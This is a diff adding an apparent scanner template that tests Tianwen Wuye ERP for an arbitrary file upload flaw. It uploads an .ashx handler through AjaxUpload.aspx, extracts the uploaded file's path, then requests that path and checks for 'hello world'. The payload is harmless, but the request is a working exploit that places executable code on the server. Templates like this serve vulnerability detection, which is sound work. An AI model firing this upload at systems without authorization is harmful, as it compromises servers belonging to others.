@@ -1,0 +1,62 @@
+id: tianwen-wuye-erp-ajaxupload-upload
+info:
+  name: Tianwen Wuye ERP Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /HM/M_Main/AjaxUpload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"
+
+        <% @ webhandler language="C#" class="AverageHandler" %>
+        using System;
+        using System.Web;
+
+        public class AverageHandler : IHttpHandler
+        {
+            public bool IsReusable
+            {
+              get {
+                return true;
+              }
+            }
+            public void ProcessRequest(HttpContext ctx)
+            {
+              ctx.Response.Write("hello world");
+            }
+        }
+        --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/HM/M_Main/UploadFiles/PersonAdjunct"
+        part: body
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "(?m)/HM/M_Main/UploadFiles/PersonAdjunct.*"
+        internal: true
+  - raw:
+      - |
+        GET {{path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello world"
+        part: body
